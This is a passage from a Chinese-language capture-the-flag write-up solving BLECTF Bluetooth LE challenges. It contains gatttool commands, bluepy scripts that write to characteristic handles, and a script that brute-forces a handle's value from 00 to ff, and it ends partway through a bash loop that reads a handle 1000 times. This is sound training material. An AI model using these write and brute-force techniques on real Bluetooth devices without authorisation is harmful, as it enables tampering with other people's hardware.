&#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p ; printf &#x27;\\n&#x27;\n\n结果如下，可以看到此次读取中-a和-u的结果是不一样的虽然0x2A00对应Device Name，但设备可能将多个特性映射到同一UUID，导致实际访问的特性与预期不符。使用-u参数时，部分蓝牙栈实现可能默认读取固定长度（如20字节），而-a参数直接读取全部数据\n┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0016|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;2b00042f7481c7b056c4b410d28f33cf┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -u 0x2a00|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -u 0x2a00 | awk -F&#x27;value: &#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p ; printf &#x27;\\n&#x27;2b00042f7481c7b056c┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -u 0x2a00handle: 0x0016   value: 32 62 30 30 30 34 32 66 37 34 38 31 63 37 62 30 35 36 63 ┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0016Characteristic value/descriptor: 32 62 30 30 30 34 32 66 37 34 38 31 63 37 62 30 35 36 63 34 62 34 31 30 64 32 38 66 33 33 63 66 \n\n所以在此次提交中我们使用-a读取到的值（记住此次提交也是提交前20个字符，使用 xxd 将其转换为十六进制）\n┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;2b00042f7481c7b056c4&quot;|xxd -ps)Characteristic value was written successfully┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;Score:4 /20\n\n\n0x5交互性验证%% 读取句柄 0032 并按照它所说的去做。请注意，它并没有像以前那样告诉你写入标志句柄。找到标志后，请继续将其写入您在过去标志中使用的标志句柄。 %%\n读取句柄\ngatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0032|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;\n在0x002c写入任意值\ngatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;123&quot;|xxd -ps)\n之后再读取0x003c值就会发生变化，将这个变化的值再填入0x002c就成功了结果\n┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0032|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;Write anything here┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;123&quot;|xxd -ps)Characteristic value was written successfully┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0032|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;3873c0270763568cf7aa  ┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;3873c0270763568cf7aa&quot;|xxd -ps)Characteristic value was written successfully┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;Score:5 /20\n0x6 写入ascii值%% 按照读取 handle 0x0034 中的说明进行作。请记住，有些工具只写入十六进制值，而其他工具提供写入十六进制或 ASCII 的方法 %%读取要求\ngatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0034|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;\n“Write the ascii value “yo” here”要求写入ascii值(yo对应的十六进制是0x79 0x6f)\ngatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0034 -n $(echo -n &quot;yo&quot;|xxd -ps)\n再次查看0x0034的值会发现它出现了变化，将新的值写入0x002c\n┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0034|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;Write the ascii value &quot;yo&quot; here   ┌──(kali㉿kali)-[~/Desktop]└─$ sudo gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0034 -n 796fCharacteristic value was written successfully┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0034|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;c55c6314b3db0a6128af┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;c55c6314b3db0a6128af&quot;|xxd -ps)Characteristic value was written successfully┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;Score:6 /20   \n\n关于这题，如果想尝试不同的写入方法可以像这样修改0x0034的值只要把0x0034的值改成不是”yo”，它就会显示最初的提示语了“Write the ascii value “yo” he”\n┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0034|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;c55c6314b3db0a6128af                                                                                                ┌──(kali㉿kali)-[~/Desktop]└─$ sudo gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0034 -n 796g[sudo] password for kali: Characteristic value was written successfully                                                                                                ┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0034|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;Write the ascii value &quot;yo&quot; he\n\n1.gatttool使用十六进制直接写入\nsudo gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0034 -n 796f\n在线转换\ngatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0034 -n $(echo -n &quot;yo&quot;|xxd -ps)\n2.bluetoothctlsudo bluetoothctl#进行连接[bluetooth]# connect 64:B7:08:61:B9:7E#进入操作菜单[BLECTF]# menu gatt#查看当前句柄[BLECTF]# list-attributes#若有目标句柄，则选中[BLECTF]# select-attribute 0x0034#尝试写入；新版本的bluetoothctl是可以直接写入的，如果不行那么写入十六进制形式[BLECTF]# write &quot;yo&quot;[BLECTF]# write &quot;0x79 0x6f&quot;\n我使用bluetoothctl时找不到句柄0x0034，所以无法使用这种方法进行写入,这是list的结果\n[BLECTF]# list-attributesPrimary Service (Handle 0x0001)        /org/bluez/hci0/dev_64_B7_08_61_B9_7E/service0001        00001801-0000-1000-8000-00805f9b34fb        Generic Attribute Profile        ...        Characteristic (Handle 0x0033)        /org/bluez/hci0/dev_64_B7_08_61_B9_7E/service0028/char0033        0000ff06-0000-1000-8000-00805f9b34fb        UnknownCharacteristic (Handle 0x0035)        /org/bluez/hci0/dev_64_B7_08_61_B9_7E/service0028/char0035        0000ff07-0000-1000-8000-00805f9b34fb        Unknown\t    ...\n0x0034是一个非标准或 CTF 特定的隐藏句柄，标准发现工具 bluetoothctl 无法看到，但可以直接操作的 gatttool -a 可以访问。\n\ngatttool -a 的行为: gatttool --char-read -a &lt;handle&gt; 和 --char-write-req -a &lt;handle&gt; 直接作用于任何你指定的句柄，不管它代表服务、特征声明、特征值还是描述符。只要该句柄存在且具有相应的读&#x2F;写权限，gatttool 就能直接与之交互。\n\n进行验证：使用0x4中查找指定值的方法我找到了0x0034\n┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --characteristics   ...handle = 0x0033, char properties = 0x0a, char value handle = 0x0034, uuid = 0000ff06-0000-1000-8000-00805f9b34fb...┌──(kali㉿kali)-[~/Desktop]└─$ sudo btmon | grep -A 5 -B 5 -i &#x27;0x0034&#x27;     [sudo] password for kali:         Handle: 0x0033        Value[5]: 0a340006ff            Properties: 0x0a              Read (0x02)              Write (0x08)            Value Handle: 0x0034            Value UUID: Unknown (0xff06)        Handle: 0x0035        Value[5]: 0a360007ff            Properties: 0x0a              Read (0x02)\n\n这是一些解释\n\nhandle &#x3D; 0x0033 (来自 gatttool –characteristics 输出)\n类型: 这是特征声明 (Characteristic Declaration) 的句柄。\n作用: 这个句柄本身代表了“这里有一个特征”的声明。它包含了一些元数据：\n该特征的属性&#x2F;权限 (Properties): 0x0a (根据 btmon 输出，这意味着 Read 0x02 + Write 0x08)。\n指向实际存储该特征值的值句柄 (Value Handle): 0x0034。\n该特征的 UUID: 0000ff06-… (标识这个特征是什么)。\n\n\n交互: 你通常不直接读取或写入特征声明句柄 (0x0033) 本身。它的值 (0a340006ff 来自 btmon) 包含了上面提到的元数据，由客户端在发现过程中读取。\n\n\nchar value handle &#x3D; 0x0034 (来自 gatttool –characteristics 输出) &#x2F; Value Handle: 0x0034 (来自 btmon 输出)\n类型: 这是特征值 (Characteristic Value) 的句柄。\n作用: 这个句柄指向实际存储数据的地方。当你想要读取这个特征当前的值，或者想要向这个特征写入新值时，你必须使用这个句柄。\n交互:\n要读取这个特征的值，你应该执行 gatttool … –char-read -a 0x0034。\n要写入这个特征的值（因为它具有 Write 属性 0x08），你应该执行 gatttool … –char-write-req -a 0x0034 -n  或 gatttool … –char-write -a 0x0034 -n 。\n\n\n\n\n\n\n0x0033 是特征声明句柄 (Characteristic Declaration Handle): 它是一个元数据条目，描述了特征的存在、属性（权限）、值句柄和 UUID。它的值包含了这些结构化的信息，通常不由客户端直接写入来改变用户数据。\n0x0034 是特征值句柄 (Characteristic Value Handle): 这才是实际存储该特征数据的地方。所有针对该特征的读写操作都应该直接作用于这个句柄。\n\n所以如果要使用bluetoothctl来修改句柄0x0034的值，需要指定对象路径/org/bluez/hci0/dev_64_B7_08_61_B9_7E/service0028/char0033而不是0x0033但我尝试了下，还是无法写入\n[BLECTF]# select-attribute /org/bluez/hci0/dev_64_B7_08_61_B9_7E/service0028/char0033[BLECTF]# write &quot;0x79 0x6f&quot;No attribute selected[BLECTF]# select-attribute 0000ff06-0000-1000-8000-00805f9b34fb[BLECTF]# write &quot;0x79 0x6f&quot;No attribute selected\n3.脚本bluepy 通常需要 root 权限来访问底层的蓝牙接口和 bluepy-helper 程序。不需要额外的进行pip install bluepy,当你尝试这样做时反而会报错不建议使用bleak来做这题，理由和bluetoothctl一样\n# -*- coding: utf-8 -*-import sysfrom bluepy import btle# --- 配置参数 ---DEVICE_ADDRESS = &quot;64:B7:08:61:B9:7E&quot;  # 替换为你的目标设备 MAC 地址# 地址类型：通常是公共地址。如果是随机地址，使用 btle.ADDR_TYPE_RANDOMADDR_TYPE = btle.ADDR_TYPE_PUBLICTARGET_HANDLE = 0x0034              # 你要写入数据的目标句柄DATA_TO_WRITE = b&quot;yo&quot;               # 要写入的 ASCII 值 &quot;yo&quot;，表示为字节串 (bytes)print(f&quot;正在连接到 &#123;DEVICE_ADDRESS&#125;...&quot;)conn = None  # 初始化连接对象为 None，以便在 finally 中检查try:    # 创建连接对象并连接    conn = btle.Peripheral(DEVICE_ADDRESS, ADDR_TYPE)    print(&quot;连接成功!&quot;)    print(f&quot;正在向句柄 &#123;hex(TARGET_HANDLE)&#125; 写入 &#123;DATA_TO_WRITE!r&#125;...&quot;)    # 执行写入操作    # 第一个参数是目标句柄    # 第二个参数是要写入的数据（必须是 bytes 类型）    # withResponse=True 表示执行 Write Request (需要响应)，类似 gatttool --char-write-req    # 如果需要 Write Command (无响应)，则设置 withResponse=False    conn.writeCharacteristic(TARGET_HANDLE, DATA_TO_WRITE, withResponse=True)    print(&quot;写入成功!&quot;)except btle.BTLEDisconnectError as e:    # 捕获断开连接错误    print(f&quot;连接已断开: &#123;e&#125;&quot;)except btle.BTLEException as e:    # 捕获其他 bluepy 相关的蓝牙错误    print(f&quot;蓝牙错误: &#123;e&#125;&quot;)except Exception as e:    # 捕获其他任何意外错误    print(f&quot;发生意外错误: &#123;e&#125;&quot;)finally:    # 无论成功还是失败，最后都尝试断开连接    if conn:        try:            print(&quot;正在断开连接...&quot;)            conn.disconnect()        except btle.BTLEException as e:             # 如果连接已因错误断开，再次断开可能会抛出异常，此处捕获             print(f&quot;断开连接时发生错误（可能已断开）: &#123;e&#125;&quot;)\n结果\n┌──(myenv)─(kali㉿kali)-[~/Desktop]└─$ sudo python ble1.py                                            正在连接到 64:B7:08:61:B9:7E...连接成功!正在向句柄 0x34 写入 b&#x27;yo&#x27;...写入成功!正在断开连接...     ┌──(myenv)─(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0034|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;c55c6314b3db0a6128af┌──(myenv)─(kali㉿kali)-[~/Desktop]└─$ \n0x7 写入hex值%% 按照读取 handle 0x0036 中的说明进行操作。请记住，有些工具只写入十六进制值，而其他工具提供写入十六进制或 ASCII 的方法 %%读取要求\ngatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0036|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;\n要求写入hex值：Write the hex value 0x07 here结果\n┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0036|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;Write the hex value 0x07 here ┌──(kali㉿kali)-[~/Desktop]└─$ sudo gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0036 -n 7Invalid value┌──(kali㉿kali)-[~/Desktop]└─$ sudo gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0036 -n 07Characteristic value was written successfully┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0036|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;1179080b29f8da16ad66┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;1179080b29f8da16ad66&quot;|xxd -ps)Characteristic value was written successfully┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;Score:7 /20\n\n1.gatttoolgatttool 的 -n 参数期望一个十六进制字符串。对于单个字节 0x07，其十六进制字符串表示就是 07。（注意是07不是7）gatttool 的 -n 参数期望接收的是一个有效的十六进制字符串，而不仅仅是一个数字字符\n\n在十六进制中，有效的字符是 0-9 和 a-f (或 A-F)。单个字符 7 是一个有效的十六进制数字，代表数值 7。\n但是， gatttool（以及底层的蓝牙协议）通常期望十六进制数据是成对出现的，因为一个字节通常用两个十六进制字符表示（例如，00 到 ff）。┌──(kali㉿kali)-[~/Desktop]└─$ sudo gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0036 -n 7Invalid value┌──(kali㉿kali)-[~/Desktop]└─$ sudo gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0036 -n 07Characteristic value was written successfully┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0036|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;1179080b29f8da16ad66\n其他形式能够写入，但是判定不正确┌──(kali㉿kali)-[~/Desktop]└─$ sudo gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0036 -n 0x07Characteristic value was written successfully┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0036|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;Write the hex value 0x07 here   \n\n2.脚本使用bluepy\n# -*- coding: utf-8 -*-import sysfrom bluepy import btle# --- 配置参数 ---DEVICE_ADDRESS = &quot;64:B7:08:61:B9:7E&quot;  # 替换为你的 MAC 地址ADDR_TYPE = btle.ADDR_TYPE_PUBLICTARGET_HANDLE = 0x0036              # 目标句柄HEX_VALUE_TO_WRITE = 0x07           # 要写入的十六进制值# 将十六进制值转换为 bytes 对象data_to_write = bytes([HEX_VALUE_TO_WRITE]) # -&gt; b&#x27;\\x07&#x27;print(f&quot;正在连接到 &#123;DEVICE_ADDRESS&#125;...&quot;)conn = Nonetry:    conn = btle.Peripheral(DEVICE_ADDRESS, ADDR_TYPE)    print(&quot;连接成功!&quot;)    print(f&quot;正在向句柄 &#123;hex(TARGET_HANDLE)&#125; 写入 &#123;data_to_write!r&#125;...&quot;)    # 执行写入操作, withResponse=True 表示 Write Request    conn.writeCharacteristic(TARGET_HANDLE, data_to_write, withResponse=True)    print(&quot;写入成功!&quot;)except btle.BTLEDisconnectError as e:    print(f&quot;连接已断开: &#123;e&#125;&quot;)except btle.BTLEException as e:    print(f&quot;蓝牙错误: &#123;e&#125;&quot;)except Exception as e:    print(f&quot;发生意外错误: &#123;e&#125;&quot;)finally:    if conn:        try:            print(&quot;正在断开连接...&quot;)            conn.disconnect()        except btle.BTLEException as e:             print(f&quot;断开连接时发生错误（可能已断开）: &#123;e&#125;&quot;)\n记得使用sudo来执行\n┌──(myenv)─(kali㉿kali)-[~/Desktop]└─$ python ble2.py                                                 Traceback (most recent call last):  File &quot;/home/kali/Desktop/ble2.py&quot;, line 3, in &lt;module&gt;    from bluepy import btleModuleNotFoundError: No module named &#x27;bluepy&#x27;┌──(myenv)─(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0036|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;Write the hex value 0x07 here┌──(myenv)─(kali㉿kali)-[~/Desktop]└─$ sudo python ble2.py                                                  [sudo] password for kali: 正在连接到 64:B7:08:61:B9:7E...连接成功!正在向句柄 0x36 写入 b&#x27;\\x07&#x27;...写入成功!正在断开连接...┌──(myenv)─(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0036|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;1179080b29f8da16ad66   \n\n\n0x8 指定句柄的方式%% 按照读取 handle 0x0038 中的说明进行作。请注意此处的句柄。请记住，句柄可以由整数或十六进制引用。大多数工具（如 gatttool 和 bleah）都允许您以两种方式指定句柄。 %%\n读取要求\ngatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0038|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;\nWrite 0xC9 to handle 58也就是说将十六进制数0xc9写入句柄58就可以了，58的十六进制是0x3A\n-a后面可以接十进制也可以接十六进制\n┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0038 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;Write 0xC9 to handle 58┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 58 -n &quot;$(printf &quot;\\xc&quot; | xxd -ps)&quot;Characteristic value was written successfully┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0038|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;f8b136d937fad6a2be9f┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;f8b136d937fad6a2be9f&quot;|xxd -ps)Characteristic value was written successfully┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;Score:8 /20\n\n0x9 多次写%% 看看 handle 0x003c 并按照它所说的去做。您应该为此编写一个解决方案。另请记住，某些工具的写入速度比其他工具快。 %%读取要求\ngatttool -b 64:B7:08:61:B9:7E --char-read -a 0x003c | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;\nBrute force my value 00 to ff爆破句柄0x003c的值\n# -*- coding: utf-8 -*-import sysimport timefrom bluepy import btle# --- 配置 ---DEVICE_ADDRESS = &quot;64:B7:08:61:B9:7E&quot;      # 目标设备 MAC 地址ADDR_TYPE = btle.ADDR_TYPE_PUBLIC       # 地址类型TARGET_HANDLE = 0x003c                  # 要写入和检查的句柄 (十六进制)INITIAL_VALUE = b&quot;Brute force my value 00 to ff&quot; # 句柄的初始值 (bytes 类型)SLEEP_INTERVAL = 0.05                   # 每次写入后的暂停时间（秒），可调整RECONNECT_DELAY = 2                     # 尝试重连前的等待时间（秒）WRITE_TIMEOUT_DEFAULT = 1.0             # 默认写入超时（bluepy内部使用）print(f&quot;Target: &#123;DEVICE_ADDRESS&#125;&quot;)print(f&quot;Target Handle: &#123;hex(TARGET_HANDLE)&#125;&quot;)print(f&quot;Initial Expected Value: &#123;INITIAL_VALUE!r&#125;&quot;)conn = None         # 初始化连接对象found_value = None  # 用于存储找到的正确值try:    print(&quot;Connecting...&quot;)    conn = btle.Peripheral(DEVICE_ADDRESS, ADDR_TYPE)    # conn.setSecurityLevel(&quot;medium&quot;) # 如果需要配对，可能需要设置安全级别    print(&quot;Connected.&quot;)    # --- 主循环：暴力破解 0x00 到 0xFF ---    for i in range(256): # 0 到 255        value_to_try = i        hex_value_str = f&quot;&#123;value_to_try:02x&#125;&quot;      # 用于打印的十六进制字符串        data_byte = bytes([value_to_try])        # 要写入的单字节 bytes 对象        print(f&quot;Trying value: &#123;hex(value_to_try)&#125; (Hex: &#123;hex_value_str&#125;, Bytes: &#123;data_byte!r&#125;)&quot;)        try:            # --- 执行写入 ---            # 使用 withResponse=True 尝试 Write Request            conn.writeCharacteristic(TARGET_HANDLE, data_byte, withResponse=True)            # print(&quot;  Write request sent successfully (protocol level).&quot;) # 可以取消注释用于调试            # --- 成功检查：读取同一个句柄的值 ---            # 等待一小段时间让设备处理            time.sleep(SLEEP_INTERVAL)            # 读取当前句柄的值            current_value = conn.readCharacteristic(TARGET_HANDLE)            print(f&quot;  -&gt; Value read back from &#123;hex(TARGET_HANDLE)&#125;: &#123;current_value!r&#125;&quot;)            # 检查值是否已经改变 (不再是初始值)            if current_value != INITIAL_VALUE:                print(f&quot;\\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;)                print(f&quot;!!! SUCCESS: Handle &#123;hex(TARGET_HANDLE)&#125; value changed!           !!!&quot;)                print(f&quot;!!! Correct value likely: &#123;hex(value_to_try)&#125; (Hex: &#123;hex_value_str&#125;)        !!!&quot;)                print(f&quot;!!! New value in handle: &#123;current_value!r&#125; !!!&quot;)                print(f&quot;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\\n&quot;)                found_value = value_to_try                break # 找到正确值，退出循环        except btle.BTLEException as e:            # --- 处理写入或读取错误 ---            print(f&quot;  -&gt; FAILED for value &#123;hex(value_to_try)&#125;: &#123;e&#125;&quot;)            # 检查是否是连接丢失错误            connection_lost = False            try:                # 尝试发送一个无操作的请求（如读取RSSI）来检查连接状态                conn.getrssi()            except btle.BTLEDisconnectError:                connection_lost = True            except btle.BTLEException:                # 其他蓝牙错误也可能意味着连接问题                connection_lost = True # 保守假设连接可能丢失            if connection_lost:                print(&quot;Connection lost, attempting to reconnect...&quot;)                time.sleep(RECONNECT_DELAY)                try:                    conn.connect(DEVICE_ADDRESS, ADDR_TYPE)                    print(&quot;Reconnected successfully.&quot;)                except Exception as recon_e:                    print(f&quot;Reconnect failed: &#123;recon_e&#125;. Aborting.&quot;)                    break # 重连失败，放弃            else:                # 如果不是连接丢失错误，可能是写入不允许或其他错误，继续下一个尝试                # print(&quot;  Continuing to next value...&quot;)                # 短暂暂停避免过于频繁的无效尝试                time.sleep(SLEEP_INTERVAL * 2) # 错误后暂停时间稍长        # 防止循环过快占用过多 CPU        time.sleep(SLEEP_INTERVAL)except btle.BTLEDisconnectError as e:    print(f&quot;\\nError: Disconnected during operation: &#123;e&#125;&quot;)except btle.BTLEException as e:    print(f&quot;\\nError: Bluetooth operation failed: &#123;e&#125;&quot;)except KeyboardInterrupt:    print(&quot;\\nOperation cancelled by user.&quot;)except Exception as e:    print(f&quot;\\nAn unexpected error occurred: &#123;e&#125;&quot;)finally:    # --- 清理：确保断开连接 ---    if conn:        try:            print(&quot;Disconnecting...&quot;)            conn.disconnect()        except btle.BTLEException:            # 可能已经断开连接，忽略错误            pass# --- 结果报告 ---if found_value is not None:    print(f&quot;\\nBrute force finished. The correct value appears to be: &#123;hex(found_value)&#125; (Decimal: &#123;found_value&#125;)&quot;)    sys.exit(0) # 成功退出else:    print(&quot;\\nBrute force finished. The correct value was not found (or the handle value did not change).&quot;)    sys.exit(1) # 失败退出\n输出为\nTrying value: 0xd0 (Hex: d0, Bytes: b&#x27;\\xd0&#x27;)  -&gt; Value read back from 0x3c: b&#x27;Brute force my value 00 to ff&#x27;Trying value: 0xd1 (Hex: d1, Bytes: b&#x27;\\xd1&#x27;)  -&gt; Value read back from 0x3c: b&#x27;933c1fcfa8ed52d2ec05&#x27;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! SUCCESS: Handle 0x3c value changed!           !!!!!! Correct value likely: 0xd1 (Hex: d1)        !!!!!! New value in handle: b&#x27;933c1fcfa8ed52d2ec05&#x27; !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!Disconnecting...Brute force finished. The correct value appears to be: 0xd1 (Decimal: 209)\n进行验证\n┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;933c1fcfa8ed52d2ec05&quot;|xxd -ps)Characteristic value was written successfully┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;Score:9 /20\n\n\n0x10 多次读%% 看看 Handle 0x003e 并按照它所说的去做。请记住，某些工具在执行读取和写入时比其他工具具有更好的连接速度。这与该工具提供的功能或它如何在主机 OS 上使用缓存的 BT 连接有关。尝试针对此标志测试不同的工具。找到最快的一个后，启动脚本或 bash 1 liner 以完成任务。仅供参考，一旦运行，如果作得当，此任务大约需要 90 秒才能完成。 %%读取要求\ngatttool -b 64:B7:08:61:B9:7E --char-read -a 0x003e | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;\nRead me 1000 times读取0x003e一千次\n执行一千次shell操作执行一千次shell操作并打印最后十次的结果\ngatttool -b 64:B7:08:61:B9:7E --char-read -a 0x003e | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\\n&#x27;\n设定时间为三分钟，一旦出现报错就立即停止\n#!/bin/bash# --- 配置 ---MAC=&quot;64:B7:08:61:B9:7E&quot;HANDLE=&quot;0x003e&quot;COUNT=1000LAST_N=10 # 只打印最后 N 次的结果READ_TIMEOUT=5 # gatttool 读取超时（秒）MAX_DURATION_SECONDS=180 # 最大总执行时间（秒），3分钟# --- 用于存储最后 N 个结果的数组 ---declare -a last_results# --- 开始时间和计数器 